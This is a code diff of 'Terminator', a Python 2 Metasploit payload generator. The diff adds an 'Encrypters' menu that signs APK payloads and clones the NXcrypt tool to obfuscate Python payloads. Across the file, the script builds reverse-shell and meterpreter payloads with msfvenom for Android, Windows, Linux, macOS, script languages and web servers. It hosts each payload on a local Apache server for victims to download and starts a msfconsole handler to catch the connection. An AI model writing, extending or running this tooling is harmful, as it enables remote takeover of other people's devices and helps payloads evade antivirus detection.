@@ -1,4 +1,4 @@
-#Coded By Mohamed Nour
+#Coded_By_Mohamed_Nour
 
 import os
 import sys
@@ -6,11 +6,16 @@ import urllib
 ##################################
 yes = set(['yes','y', 'ye', 'Y'])
 no = set(['no','n'])
+G = '\033[92m' #green
+Y = '\033[93m' #yellow
+B = '\033[94m' #blue
+R = '\033[91m' #red
+W = '\033[0m' #white
 ##################################
-def clear(): 
+def clear():
 	if os.name == 'nt':
 		os.system('cls')
-	else: 
+	else:
 		os.system('clear')
 ###############################
 def msf():
@@ -21,41 +26,7 @@ def msf():
 	else :
 		print "OK BB !"
 		sys.exit(0)
-def banner():
-	print ("""
 
-           _________
-         /'        /|
-        /         / |_
-       /         /  //|
-      /_________/  ////|
-     |   _ _    | 8o////|
-     | /'// )_  |   8///|
-     |/ // // ) |   8o///|
-     / // // //,|  /  8//|
-    / // // /// | /   8//|
-   / // // ///__|/    8//|
-  /.(_)// /// |       8///|
- (_)' `(_)//| |       8////|___________
-(_) /_\ (_)'| |        8///////////////
-(_) \"/ (_)'|_|         8/////////////
- (_)._.(_) d' Hb         8oooooooopb'
-   `(_)'  d'  H`b       -------------------
-         d'   `b`b      |    TERMINATOR   |
-        d'     H `b     |Payload Generator|
-       d'      `b `b    |     AUTHORS:    |
-      d'           `b   |   MOHAMED NOUR  |
-     d'             `b  |   SABER SEBRI   |
-                        -------------------
-
-List payloads:
-
-1) Binaries Payloads
-2) Scripting Payloads
-3) Web Payloads
-
-
-""")
 
 def bin():
 	print("""
@@ -76,7 +47,7 @@ def bin():
 		linux()
 	elif bn == "4":
 		mac()
-	else: 
+	else:
 		menu()
 
 def web():
@@ -95,7 +66,7 @@ def web():
 		jsp()
 	elif wb == "3":
 		war()
-	else: 
+	else:
 		menu()
 
 def script():
@@ -114,19 +85,36 @@ def script():
 		perl()
 	elif sc == "3":
 		bash()
-	else: 
+	else:
 		menu()
+
+def enc():
+	print("""
+  1) APK Encrypter
+  2) Python Python
+
+""")
+        en = raw_input("Set Payload: ")
+        print("")
+        if en == "1":
+                apkenc()
+        elif en == "2":
+                pyenc()
+        else:
+                menu()
+
+
 def android():
 	lhost = raw_input("Enter LHOST: ")
 	lport = raw_input("Enter LPORT: ")
-	name  = raw_input("Enter Payload Name: ")	
+	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk"%(lhost,lport,name))
 	clear()
 	print "Payload Successfuly Generated"
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.apk /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.apk"%(lhost,name)
@@ -141,7 +129,7 @@ def android():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else : 
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD android/meterpreter/reverse_tcp
@@ -162,7 +150,7 @@ def windows():
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.exe /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.exe"%(lhost,name)
@@ -177,7 +165,7 @@ def windows():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else : 
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD windows/shell/reverse_tcp
@@ -189,7 +177,7 @@ def windows():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-def linux():  
+def linux():
 	lhost = raw_input("Enter LHOST: ")
 	lport = raw_input("Enter LPORT: ")
 	name  = raw_input("Enter Payload Name: ")
@@ -199,7 +187,7 @@ def linux():
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.elf /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.elf"%(lhost,name)
@@ -214,7 +202,7 @@ def linux():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else : 
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD linux/x86/meterpreter/reverse_tcp
@@ -237,7 +225,7 @@ def mac():
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.macho /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.macho"%(lhost,name)
@@ -252,7 +240,7 @@ def mac():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else :  
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD osx/x86/shell_reverse_tcp
@@ -276,7 +264,7 @@ def python():
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.py /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.py"%(lhost,name)
@@ -291,7 +279,7 @@ def python():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else :  
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD cmd/unix/reverse_python
@@ -314,7 +302,7 @@ def perl():
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.pl /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.pl"%(lhost,name)
@@ -329,7 +317,7 @@ def perl():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else : 
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD cmd/unix/reverse_perl
@@ -352,7 +340,7 @@ def bash():
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.sh /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.sh"%(lhost,name)
@@ -367,7 +355,7 @@ def bash():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else : 
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD cmd/unix/reverse_bash
@@ -388,7 +376,7 @@ def asp():
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.asp /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.asp"%(lhost,name)
@@ -414,7 +402,7 @@ def asp():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else :  
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD windows/meterpreter/reverse_tcp
@@ -435,7 +423,7 @@ def jsp():
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.jsp /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.jsp"%(lhost,name)
@@ -450,7 +438,7 @@ def jsp():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else : 
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD java/jsp_shell_reverse_tcp
@@ -471,7 +459,7 @@ def war():
 	print "[1]-Do You Want To Start a listenner"
 	print "[2]-Do You Want To Start an IP Poisener "
 	li = raw_input()
-	if li == '2' : 
+	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.war /var/www/html'%(name))
 		print "Your IP Successfully Poisened : %s/%s.war"%(lhost,name)
@@ -486,7 +474,7 @@ def war():
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
 
-	else :  
+	else :
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD java/jsp_shell_reverse_tcp
@@ -497,6 +485,54 @@ def war():
 		with open('listener.rc', 'w') as f :
 			f.write(listen)
 		os.system('msfconsole -r listener.rc')
+
+def apkenc():
+	filename = raw_input("Enter Your Payload Name (ex.apk) : ")
+        os.system("keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000")
+        os.system("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore %s alias_name"%(filename))
+        print("Your Payload Has Been Successfully Encrypted !")
+
+def pyenc():
+        check = raw_input("Is It Your First Time ? (y/N) :")
+        pypayload = raw_input("Enter Your Python Payload Name (ex.py) : ")
+        pyoutput = raw_input("Enter The Output Name of Your Payload : ") 
+        if check in no:
+            os.system("cd NXcrypt && sudo python NXcrypt.py -f ../%s -o ../%s"%(pypayload,pyoutput))
+        else:
+            os.system("git clone https://github.com/Hadi999/NXcrypt.git")
+            os.system("cd NXcrypt && sudo python NXcrypt.py -f ../%s -o ../%s"%(pypayload,pyoutput))
+
+####################  BANNER  #######################
+def banner():
+    print ("""
+
+%s
+_________ _______  _______  _______ _________ _        _______ _________ _______  _______ 
+\__   __/(  ____ \(  ____ )(       )\__   __/( (    /|(  ___  )\__   __/(  ___  )(  ____ )
+   ) (   | (    \/| (    )|| () () |   ) (   |  \  ( || (   ) |   ) (   | (   ) || (    )|
+   | |   | (__    | (____)|| || || |   | |   |   \ | || (___) |   | |   | |   | || (____)|
+   | |   |  __)   |     __)| |(_)| |   | |   | (\ \) ||  ___  |   | |   | |   | ||     __)
+   | |   | (      | (\ (   | |   | |   | |   | | \   || (   ) |   | |   | |   | || (\ (   
+   | |   | (____/\| ) \ \__| )   ( |___) (___| )  \  || )   ( |   | |   | (___) || ) \ \__
+   )_(   (_______/|/   \__/|/     \|\_______/|/    )_)|/     \|   )_(   (_______)|/   \__/
+   %s
+
+                         [+]    Metasploit Payload Generator     [+]
+                         [+] Created By MohamedNour & SaberSebri [+]
+                Visit https://github.com/MohamedNourTN/Terminator to update
+
+
+%s
+List payloads:
+
+ 1) Binaries Payloads
+ 2) Scripting Payloads
+ 3) Web Payloads
+ 4) Encrypters
+
+"""%(R,G,B))
+####################  BANNER  #######################
+
 print("-----------------------------------------------")
 print("Is Metasploit Installed In Your Machine ? (Y/N)")
 print("-----------------------------------------------")
@@ -509,7 +545,7 @@ elif mscheck in yes:
 else: 
 	banner()
 
-menu = raw_input("Choose Payload: ")
+menu = raw_input(" Select from the menu : ")
 print("")
 
 if menu == "1":
@@ -518,5 +554,9 @@ elif menu == "2":
 	script()
 elif menu == "3":
 	web()
-else: 
+elif menu == "4":
+	enc()
+
+else:
 	menu()
+
